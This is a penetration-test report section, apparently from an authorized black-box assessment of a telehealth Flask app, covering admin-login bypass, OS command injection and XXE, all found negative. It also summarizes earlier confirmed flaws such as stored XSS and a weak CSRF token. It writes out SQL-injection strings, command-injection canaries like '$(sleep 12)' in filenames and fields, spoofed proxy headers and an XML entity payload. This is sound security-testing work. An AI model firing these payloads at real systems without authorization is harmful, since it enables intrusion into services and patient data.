**Bottom line:** the prior “no RCE / no admin bypass” conclusions remain true for the tested vectors, but the application is not low-risk. A public uploaded-file stored XSS was chained end-to-end to patient account takeover; the profile endpoint changes email and password without the current password; the transfer CSRF token is `md5(user_id)`; logout and password changes do not revoke sessions; the session cookie is accepted over HTTP; and a valid public promo code lets the client set a 90% lab discount. Cross-user report IDOR and cross-account transfer logic remain the most important unresolved tests.

---

### D.13 — Scoped Review: Admin Portal Authentication/Authorization, OS Command Injection, XXE

**Assessment context**

- **Target:** `https://magnetic-paragraph-romance-hobbies.trycloudflare.com/` (live during this pass; Quick Tunnel hostname rotates).
- **Date of this pass:** 2026-10-27 UTC.
- **Account:** the explicitly authorized test account `te@st` / `123456` (`user_id` 896). No second account was created or used.
- **Source code:** none available locally. This remained a black-box review; no `os.system`, `subprocess`, `shell=True`, or `os.popen` sink could be reviewed directly.
- **Scope:** only (1) admin portal authentication/authorization, (2) OS command injection, and (3) XXE. Stored XSS, CSRF, profile behavior, pricing manipulation, and previously confirmed findings were not re-investigated and are not scored here.
- **Constraints applied:** no brute force, no password guessing against real administrators, no destructive writes, no denial of service, no local-file/network/cloud-metadata/OOB entity access, no real patient data. Only the authorized account and benign canaries were used.
- **Verdict for these three objectives:** no admin authentication bypass, no admin/patient privilege escalation, no OS command injection, and no XXE were confirmed. The tested surfaces are negative. This is not proof of absence: the admin account store, admin-only pages, server source, and any third-party integrations remain outside observable reach.

**Classification key:** `CONFIRMED` = reproduced with direct evidence; `NOT CONFIRMED` = tested and failed; `INCONCLUSIVE` = evidence insufficient or the test was not technically possible; `NOT TESTED` = deliberately not exercised because of scope, authorization, or data-protection limits.

---

#### 1. Admin portal authentication and authorization

##### 1.1 Previous coverage reviewed

- `D.11` established that `/admin_portal_temp_secure_9203` is anonymously reachable, returns a login form with no CSRF token, and rejects empty, random, and valid patient credentials with `Administrative email account not found in system.` No admin session or content was obtained.
- The later `D.12 — Flask Security Skill` independently reproduced the same negative result and recorded `F13` (missing CSRF token and shared Flask session for flash messages). It did not obtain an admin session or find an admin route.
- Prior conclusions that the patient account, the unsigned report token, `user_id: 999`, and `is_admin`/`role` token fields do not grant admin access were treated as baseline and were not re-litigated.

##### 1.2 Endpoint and method inventory (new requests)

```http
GET /admin_portal_temp_secure_9203
HTTP/2 200
content-type: text/html; charset=utf-8
vary: Cookie
```

The body is the admin login form only:

```html
<form action="/admin_portal_temp_secure_9203" method="POST">
  <input type="email" id="admin_email" name="email" required ...>
  <input type="password" id="admin_password" name="password" required ...>
</form>
```

No hidden privilege field, no `csrf_token`, no admin navigation, and no dashboard content were present. With an authenticated patient session the same page rendered, with only the normal patient navigation and `Welcome back, test!`.

| Probe | Result |
|---|---|
| `OPTIONS /admin_portal_temp_secure_9203` | `200`; `Allow: OPTIONS, HEAD, POST, GET` |
| `HEAD` | `200` |
| `PUT`, `DELETE`, `PATCH` | `405`; `Allow: OPTIONS, HEAD, POST, GET` |
| `TRACE` | `405` |
| `GET /admin_portal_temp_secure_9203/` (trailing slash) | `404` |
| `GET /Admin_portal_temp_secure_9203`, `/ADMIN_PORTAL_TEMP_SECURE_9203` | `404` |
| `GET /admin_portal_temp_secure_9203/{dashboard,admin,login,users,patients,reports,panel,console,home,index,auth,api,static}` | all `404` |
| `GET /admin_portal_temp_secure_9203/logout` | `302 -> /admin_portal_temp_secure_9203` |
| `GET /admin`, `/admin/dashboard` | `404` |
| `GET /api/v1/admin`, `/api/v1/admin/login`, `/api/v1/admin/users`, `/api/v1/admin/dashboard`, `/api/v1/reports`, `/api/v1/patients`, `/admin/api`, `/soap`, `/wsdl`, `/xmlrpc.php`, `/api/xml` | all `404` |
| `GET /console`, `/admin_portal_temp_secure_9203/console`, `/_debug_toolbar`, `/debug` | all `404` |

The portal therefore exposes one login path and one logout path in the observed routing; no admin API or debug console was found.

##### 1.3 Login-logic probes

All admin login POSTs were sent with the authorized patient session where a session was used (`-b cj.txt`), and the response body was inspected for the exact message.

| POST body / technique | Response |
|---|---|
| `email=te@st&password=123456` (valid **patient** credentials) | `200`, `10674` bytes, `Administrative email account not found in system.` |
| `email=nobody-xyz-4821@example.invalid&password=whatever123` | same message |
| empty body; email only; password only | same message |
| `is_admin=1`; `role=admin`; `admin=1` added to patient credentials | same message; no admin content |
| `email[]=te@st&password=123456` (array type confusion) | same message; no `500` |
| duplicate `email` parameters (`te@st` and `info@nilecare.com`) | same message |
| JSON body `{"email":"te@st","password":"123456"}` | same message |
| multipart form with patient credentials | same message |
| `POST ...?email=te@st&password=123456` with an empty body (query-string/`request.values` hypothesis) | same message |
| `GET ...?email=te@st&password=123456` | `200`, login form; no authentication |
| `email='` | `200`, same message; no SQL error/traceback |
| `email=admin' OR '1'='1` | `200`, same message; no SQL error/traceback |
| `email=admin'--` | `200`, same message; no SQL error/traceback |
| `email=$(sleep 12)@example.invalid&password=x` (sink canary) | `200`, same message; `0.44 s` vs `0.46 s` control; no delay |
| Public contact address `info@nilecare.com` with a clearly invalid one-shot password | `200`, same message; no session. This was a single message-parity probe, not a credential attack; no real password was tried. |

One-shot public-address note: the address was decoded from the Cloudflare-obfuscated footer (`info@nilecare.com`) and tested once with `probe-not-a-real-password-7f3a`. It returned the same “not found” message, so it did not establish an admin account or an enumeration oracle. No further attempts were made.

##### 1.4 Headers, query, and mass-assignment hypotheses

| Hypothesis | Request | Result |
|---|---|---|
| Query parameters are trusted as role flags | `GET /admin_portal_temp_secure_9203?is_admin=1`, `?role=admin`, `?admin=1`, `?user_id=999&is_admin=1&role=admin&admin=1` | all `200`, login form, same `10308`-byte body; no admin content |
| Localhost/proxy headers bypass an IP check | `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: 127.0.0.1`, `X-Originating-IP: 127.0.0.1`, `X-Remote-Addr: 127.0.0.1`, `X-Forwarded-Host: localhost` on `GET` and on a POST | all login form / same not-found message; no bypass |
| `request.values` merges query and form credentials | `POST ...?email=...&password=...` with empty body | not-found message; no session |
| Content negotiation exposes an API | `Accept: application/json`, `Accept: text/plain`, `X-Requested-With: XMLHttpRequest` on the admin GET | `200 text/html`, login form; no JSON/API response |
| Mass assignment through `/profile` sets an admin flag | `POST /profile` with `full_name=test&email=te@st&phone=0111111111111&password=&is_admin=1&role=admin&admin=1&user_type=admin&account_type=admin` | flash `Profile updated successfully!`; session remained exactly `patient_email=te@st`, `patient_name=test`, `user_id=896`; admin GET still login form; admin POST still not-found |

The `/profile` mass-assignment test did not modify the email, name, phone, password, or avatar; the values were re-submitted unchanged.

##### 1.5 Patient/admin session separation

A patient session was copied to a separate jar, then `GET /admin_portal_temp_secure_9203/logout` was requested:

```http
GET /admin_portal_temp_secure_9203/logout
HTTP/2 302
location: /admin_portal_temp_secure_9203
set-cookie: session=<new signed value>; HttpOnly; Path=/
```

Decoded session after the admin logout:

```json
{"_flashes":[{" t":["success","Welcome back, test!"]},{" t":["success","Logged out from admin session."]}],
 "patient_email":"te@st","patient_name":"test","user_id":896}
```

`GET /dashboard` with that resulting cookie still returned `200` and the patient UI. The admin logout adds a flash to the shared Flask session but does **not** clear the patient authentication and does **not** create or expose an admin identity. The unrelated original patient jar remained `200` on `/dashboard`.

A failed admin login with an existing patient session likewise only re-signed the session to carry the flash; it did not add `admin_*`, `is_admin`, or `role` keys, and did not change `user_id`.

##### 1.6 Admin conclusion

**Classification: NOT CONFIRMED (no authentication bypass or broken access control in the tested paths).**

- The portal is a separate login backed by an administrative account store. Valid patient credentials, random addresses, the public contact address with an invalid password, SQL-syntax probes, type confusion, parameter pollution, JSON/multipart/query-string variants, role flags, localhost headers, and `/profile` mass assignment all failed.
- No admin session, admin content, admin navigation, admin API, or debug console was obtained.
- The shared Flask session is used for flash messages only in the observed flow; it does not confer admin privilege. Admin logout does not affect the patient session, and patient authentication does not satisfy the admin portal.
- Failure reason: the admin login performs an administrative-store lookup (the same generic “not found” message is returned), and the Flask session is signed. No tested input reached a privilege decision that could be influenced.
- **Remaining uncertainty:** real administrator credentials, MFA, lockout/rate limiting, admin password-reset token security, admin-only pages reached after a successful login, and secret-key compromise were not tested. The admin account store and server source remain unobservable. The `admin@nilecare.com` placeholder in `/forgot-password` was noted but was **not** used for a login attempt, in line with the no-real-admin-account constraint.

---

#### 2. OS command injection

##### 2.1 Previous coverage reviewed

The earlier `D.12 OS command injection — tested (negative)` tested:

- Attachment/profile upload filenames with `$(sleep 5/20)`, backticks, `;`, `|`, `&&`, and `$(id)`; filenames were stored literally and no consistent delay occurred.
- Doctor search `search=test;sleep 15`, `$(sleep 15)`, and backticks; no delay.
- Contact `subject=$(sleep 20)`; no delay.
- Lab `discount_code=$(sleep 20)`; no delay.
- Booking `notes=$(sleep 20)`; no delay.
- Report token fields with `$(sleep 15)`; no delay.
- `.jpg.py` served as static `text/x-python`, profile `.py` rejected, and report-body SSTI literal; no Python/shell execution.

Those vectors were not repeated without a new hypothesis.

##### 2.2 New sink hypotheses and results

Baseline Quick Tunnel latency was variable (roughly `0.4–4.2 s`). A `sleep 12` payload would add a clearly distinguishable delay; the tests below used both timing and output/literal-storage checks.

**A. PDF upload filename processing (new branch; prior filename tests used `.jpg`)**

The attachment endpoint accepts PDF by declared MIME type and allowed extension. A minimal valid PDF was used as the body.

| Filename (properly quoted in `curl -F`) | Time | Stored/rendered result |
|---|---|---|
| `ci-control.pdf` (control) | `2.19 s` | accepted; stored as `ci-control.pdf` |
| `ci$(sleep 12).pdf` | `1.92 s` | accepted; flash URL contained the literal `ci$(sleep 12).pdf`; no `+12 s` |
| `ci;sleep 12;#x.pdf` | `1.18 s` | accepted; flash URL contained the literal name; no `+12 s` |
| `ci\|sleep 12\|.pdf` | `0.62 s` | accepted; literal name; no delay |
| ``ci`sleep 12`.pdf`` | `0.52 s` | accepted; literal name; no delay |
| `ci&&sleep 12&&.pdf` | `1.91 s` | accepted; literal name; no delay |

The first semicolon attempt (`ci;sleep 12;.pdf`) was rejected with `Allowed extensions ... not found in filename!` because curl's `-F` parser treats `;` as an attribute separator. It was repeated with the filename quoted (`filename="ci;sleep 12;#x.pdf"`), which the server accepted and stored literally. This avoids a false negative caused by the client tool.

Byte-for-byte check:

```bash
sha256sum ci-control.pdf stored-control.pdf
# 64ed770dbc73fee744ace4b8f6dbedbf57e6b24f155af9f4b86a5dc7850a5247  ci-control.pdf
# 64ed770dbc73fee744ace4b8f6dbedbf57e6b24f155af9f4b86a5dc7850a5247  stored-control.pdf

sha256sum ci-control.pdf stored-payload.pdf
# 64ed770dbc73fee744ace4b8f6dbedbf57e6b24f155af9f4b86a5dc7850a5247  ci-control.pdf
# 64ed770dbc73fee744ace4b8f6dbedbf57e6b24f155af9f4b86a5dc7850a5247  stored-payload.pdf
```

The payload PDF was served with `content-type: application/pdf` and `content-disposition: inline; filename="ci$(sleep 12).pdf"`. There is no re-encoding or converter step visible, and the filename is stored literally. This is consistent with a direct file write, not a shell invocation.

**B. Report creation fields (title/lab/status) — output canary**

A report was created with command-substitution markers and then viewed:

```bash
POST /reports/create
title=CI-$(id)-4f2a
lab=CI-$(hostname)-4f2a
status=completed
report_file=CI command substitution canary 4f2a
```

The dashboard and report `3996` rendered:

```text
CI-$(id)-4f2a
CI-$(hostname)-4f2a
```

There was no `uid=`, no hostname expansion, and no substituted output. The command substitutions were literal, so the fields did not reach a shell.

**C. Contact form fields (name/email/subject/message)**

| Request | Time | Result |
|---|---|---|
| control: `name=CI Control 4f2a`, `email=ci-control@example.invalid`, `subject=CI control`, `message=control message` | `4.24 s` | flash `Thank you! Your message has been sent to our administration.` |
| all fields with `$(sleep 12)` | `3.32 s` | same success flash; no `+12 s` |
| metacharacters in all four fields (see below) | `0.55 s` | same success flash; no delay |

The metacharacter submission used:

```text
name=ci;sleep 12;#
email=ci|sleep 12|@example.invalid
subject=ci&&sleep 12&&
message=ci`sleep 12`
```


The all-field `$()` and metacharacter submissions were accepted as ordinary text. No command substitution or sequencing delay was observed.

**D. Forgot-password email**

| Email | Time | Result |
|---|---|---|
| `te@st` (control) | `2.40 s` | `302 -> /forgot-password`; no error flash |
| `te@st$(sleep 12)` | `1.30 s` | `302 -> /forgot-password`; no `+12 s` |
| `te@st;sleep 12` | `0.77 s` | `302 -> /forgot-password`; no delay |

The endpoint did not expose a shell timing signal, and the submitted strings did not visibly reach a mailer command. This remains time-only evidence because no email inbox/log was available.

**E. Points-transfer recipient**

A failed transfer to a non-existent recipient was used so no points could move:

| Recipient | Amount | Time | Result |
|---|---|---|---|
| `ci-4f2a-control@example.invalid` | `1` | `0.54 s` | flash `Recipient email not found in NileCare records.` |
| `ci$(sleep 12)-4f2a@example.invalid` | `1` | `0.40 s` | same not-found flash; no delay |

The recipient lookup failed before any notification/shell step; no points were transferred.

**F. Admin login email (sink canary)**

| Email | Password | Time | Result |
|---|---|---|---|
| `ci-control@example.invalid` | `x` | `0.46 s` | `200`, `Administrative email account not found in system.` |
| `ci$(sleep 12)@example.invalid` | `x` | `0.44 s` | same; no delay |

**G. Previously negative vectors**

The prior results for `.jpg`/profile upload filenames, doctor search, contact subject, lab discount code, booking notes, and report-token fields were not contradicted by any new evidence. The `.jpg.py` static-serving result, profile `.py` rejection, and literal report-body SSTI remain negative for server-side execution.

##### 2.3 Command-injection conclusion

**Classification: NOT CONFIRMED.**

- No response reflected command output, no filename or text field expanded `$(...)`/backticks, and no `sleep 12` payload produced a consistent delay.
- PDF uploads and the earlier JPEG uploads are stored byte-for-byte; the attachment path is a direct file write, not a visible converter/shell pipeline.
- **Why the tests failed to find injection:** the observable handlers store or render values as data; the PDF path has no processing step; the upload filter is extension/MIME-based; and no source or error traceback exposed a `subprocess`/`os.system` call. The negative result is consistent with ordinary Python file I/O and database operations.
- **Remaining uncertainty:** a mailer used by `/contact` or `/forgot-password` could invoke a shell asynchronously, in which case response timing would not show the delay; no server logs, inbox, or source were available to observe that. No source review of `os.system`, `subprocess.run/Popen`, `shell=True`, or `os.popen` was possible. Image/PDF content processing was not observed (byte-for-byte storage), but downstream processing by another component cannot be excluded. **No OS command injection is claimed.**

---

#### 3. XXE

##### 3.1 Previous coverage reviewed

The later `D.12 — Flask Security Skill` recorded that no XML input surface had been identified or tested. The earlier recon did not exercise XML either. This pass therefore started by testing whether any endpoint parses XML at all.

##### 3.2 Raw XML request bodies

A well-formed XML document with an **internal** entity was sent; no external entity, file path, internal address, or OOB callback was used:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [<!ENTITY xxe "NILECARE-XXE-4f2a">]>
<r>
  <email>te@st</email><password>123456</password>
  <name>XMLNAME</name><subject>XMLSUBJ</subject><message>XMLMSG</message>
  <title>XMLTITLE</title><lab>XMLLAB</lab><status>completed</status>
  <report_file>XMLBODY</report_file>
</r>
```

Sent with `Content-Type: application/xml`:

| Endpoint | Response | Entity/canary evidence |
|---|---|---|
| `POST /login` | `302 -> /login`; no session | no canary; XML not parsed into form |
| `POST /contact` | `302 -> /#contact` | no canary; treated as empty form |
| `POST /forgot-password` | `302 -> /forgot-password` | no canary |
| `POST /reports/create` | `302 -> /dashboard`; no new report | no canary |
| `POST /lab-tests/book` | `302 -> /lab-tests` | no canary |
| `POST /profile` | `302 -> /profile`; flash `Name, email and phone fields are required.` | no canary; no XML-to-form mapping |
| `POST /reports/upload-attachment` | `302 -> /dashboard`; flash `No attachment file selected.` | no raw-XML parser |
| `POST /book` | `302 -> /book`; flash `All marked fields are required.` | no canary |
| `POST /transfer_points` | `302 -> /dashboard`; flash `CSRF token validation failed! Security alert logged.` | XML body did not supply the form token; no canary |
| `POST /admin_portal_temp_secure_9203` | `200`; admin login form | no canary |
| `POST /api/v1/reports/view` | `405` | method not allowed |
| `POST /login`, `/contact`, `/forgot-password` with malformed XML | same status/redirects as the well-formed XML and as empty forms | no parser error or traceback |

No response contained the internal entity value outside the submitted body, and no XML body populated normal form fields. The application ignored the XML content type rather than parsing it.

##### 3.3 XML through upload paths

| Test | Result |
|---|---|
| `POST /reports/upload-attachment`, file `fsa-xxe-4f2a.xml`, declared `text/xml` | rejected: `Only PNG, JPEG, and PDF MIME types are permitted!`; `GET /static/uploads/attachments/fsa-xxe-4f2a.xml` -> `404` (not stored) |
| `POST /reports/upload-attachment`, `fsa-xxe-4f2a.jpg.xml` = 20-byte JPEG header + XML internal entity, declared `image/jpeg` | accepted; `GET` -> `200 application/xml; charset=utf-8`, `Content-Disposition: inline; filename=fsa-xxe-4f2a.jpg.xml`; stored bytes were **byte-for-byte identical** to the upload (SHA-256 `2a77e09c7ceeb49338fd65823262b6be6a3ee98d73bba9cd6c43e23ab94e5b49`); the body still contained the literal `&xxe;`; the canary appeared only inside the `<!ENTITY ...>` declaration, not as an expansion |
| `POST /profile`, `fsa-xxe-4f2a.xml` (correct field `profile_image`) | rejected: `Invalid image format. Allowed formats: png, jpg, jpeg, gif.` |
| `POST /profile`, `fsa-xxe-4f2a.jpg.xml` | same rejection |
| `GET /api/v1/reports/view?token=...` with `Accept: application/xml`, `text/xml`, `application/json` | `200 text/html` in all cases; no XML/JSON serialization |
| `/api/v1/admin*`, `/soap`, `/wsdl`, `/xmlrpc.php`, `/api/xml` | all `404` |

The `.jpg.xml` file is stored and served as static `application/xml`. That is a static file-serving behavior, not server-side XML parsing; the server did not resolve the internal entity or rewrite the document. No external entity was used, so this does not test external-entity resolution; there was no parser to target.

##### 3.4 XXE conclusion

**Classification: NOT CONFIRMED / not applicable to the tested surfaces.**

- No server-side XML parser was identified. `application/xml` request bodies are ignored as form input, and XML uploads are either rejected or stored byte-for-byte and served statically.
- Internal entity expansion did not occur anywhere tested. No external entity, local file, internal service, cloud metadata, or OOB callback was accessed, in line with the constraints.
- **Why the tests failed to find XXE:** the app has no XML form/API/import endpoint in the observable routing; Flask does not parse `application/xml` into `request.form` by default; the upload handlers only validate extension/MIME and write bytes; and the file-serving layer does not parse XML.
- **Remaining uncertainty:** any XML import/export or integration inside the authenticated admin portal could not be reached without an admin account. A downstream PDF/XMP or other document parser outside the upload handler cannot be excluded. External-entity resolution was not tested because no parser was found and the constraints prohibit file/network/OOB access. **No XXE is claimed.**

---

#### 4. Artifacts and cleanup

**New artifacts from this pass**

| Artifact | Location | Notes |
|---|---|---|
| `fsa-xxe-4f2a.jpg.xml` | `/static/uploads/attachments/` | JPEG-header + XML internal-entity file; stored byte-for-byte; served `application/xml` inline; public |
| `ci-control.pdf` | `/static/uploads/attachments/` | benign minimal PDF control |
| `ci$(sleep 12).pdf` | `/static/uploads/attachments/` | benign PDF; literal filename; no execution |
| `ci;sleep 12;#x.pdf` | `/static/uploads/attachments/` | benign PDF; literal filename; no execution |
| `ci\|sleep 12\|.pdf` | `/static/uploads/attachments/` | benign PDF; literal filename; no execution |
| ``ci`sleep 12`.pdf`` | `/static/uploads/attachments/` | benign PDF; literal filename; no execution |
| `ci&&sleep 12&&.pdf` | `/static/uploads/attachments/` | benign PDF; literal filename; no execution |
| Report `3996` (`CI-$(id)-4f2a`) | Application database | Benign command-substitution marker; visible only to the test account |
| Three contact-form submissions | Application database | Control, all-field `$(sleep 12)`, and metacharacter submissions; all benign |
| Possible password-reset token for `te@st` | Application database | One `POST /forgot-password` control for the authorized account; no password change was made |

**Cleanup**

The app exposes no delete route for attachments, reports, or contact messages. The uploaded files remain publicly reachable under `/static/uploads/attachments/`. Remove the new files on the server:

```bash
cd static/uploads/attachments
rm -f 'fsa-xxe-4f2a.jpg.xml' \
      'ci-control.pdf' \
      'ci$(sleep 12).pdf' \
      'ci;sleep 12;#x.pdf' \
      'ci|sleep 12|.pdf' \
      'ci`sleep 12`.pdf' \
      'ci&&sleep 12&&.pdf'
```

Delete report `3996`, the three contact rows created on 2026-10-27, and any password-reset token created for `te@st` through the application database/admin tooling. The earlier artifacts listed in `D.8`/`D.12` are unchanged by this pass; their cleanup notes still apply.

**Account state:** login with `te@st` / `123456` was re-verified (`302 -> /dashboard`, then `GET /dashboard` -> `200`). The profile still shows `test`, `te@st`, `0111111111111`; the email, password, and avatar were not changed. No admin session was created.

---

#### 5. Bottom line for the three objectives

- **Admin portal:** no authentication bypass, broken access control, or patient-to-admin privilege escalation was confirmed. The portal requires a real administrative account; the patient account, role flags, query/header tricks, SQL-syntax probes, type confusion, mass assignment, and session reuse did not grant access. The shared Flask session is used for flashes only in the observed flow, and admin logout does not clear the patient session.
- **OS command injection:** no evidence was found across the prior vectors and the new PDF-filename, report-field, contact-field, forgot-password, transfer-recipient, and admin-email tests. Payloads were stored or rendered literally, PDFs were byte-for-byte unchanged, and no `sleep 12` delay was reproducible.
- **XXE:** no server-side XML parser or XML-processing surface was identified. `application/xml` bodies were ignored, XML uploads were rejected or stored byte-for-byte, and internal entities were not expanded. External-entity resolution was not tested because no parser was found and such access is outside the allowed constraints.
- **No new vulnerability is claimed in these three areas.** The remaining uncertainty is concentrated in the unreachable admin-only functionality, the unavailable server source, asynchronous mail handling, and any third-party integration or downstream document parser.
